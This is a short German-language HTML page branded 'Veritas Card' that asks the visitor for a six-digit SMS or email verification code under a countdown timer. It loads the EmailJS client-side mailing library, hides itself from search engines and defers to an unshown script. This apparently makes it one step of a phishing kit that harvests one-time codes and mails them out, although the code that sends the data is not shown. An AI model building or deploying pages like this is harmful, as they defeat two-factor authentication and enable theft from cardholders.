 <!DOCTYPE html>

<html lang="de">
<head>
<meta charset="UTF-8">

<script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<title>  Veritas Card  </title>

<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link rel="stylesheet" href="style-de.css">
 <link rel="icon" type="image/jpeg" href="../favicon.jpg">
<meta name="robots" content="noindex, nofollow">
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
<script src="code-de.js" defer></script>

</head>
<body>
  <div class="page">

   
    <div class="main">
      <div class="card">

        <div class="step active" id="step2">
  <h1>Bestätigungscode</h1>

  <p class="subtitle">
    Ein 6-stelliger Code wurde per <b>SMS</b> oder <b>E-Mail</b> gesendet
    <span id="otpPhone"></span>.
  </p>

  <form id="otpForm">
    <div class="field">
      <label for="otpSingle">Per SMS gesendeter Code</label>
      <input type="text" inputmode="numeric" maxlength="6"
        id="otpSingle" class="otp-single"
        placeholder="— — — — — —"
        autocomplete="one-time-code" required>
    </div>

    <p class="expiry-note">
      Dieser Code läuft in <b id="otpTimer">30</b>s ab.
    </p>

    <button type="submit" class="btn-signin">Bestätigen</button>
    <div id="result"></div>

    <div class="timer-row">
      <span class="resend disabled" id="resendLink">
        Code erneut senden <span id="resendCount">(in 10s)</span>
      </span>
      <a href="#" class="no-number-link">
        Zurück · Ich habe diese Nummer nicht mehr
      </a>
    </div>
          </form>
        </div>

      </div>
    </div>

  </div>
</body>
</html>
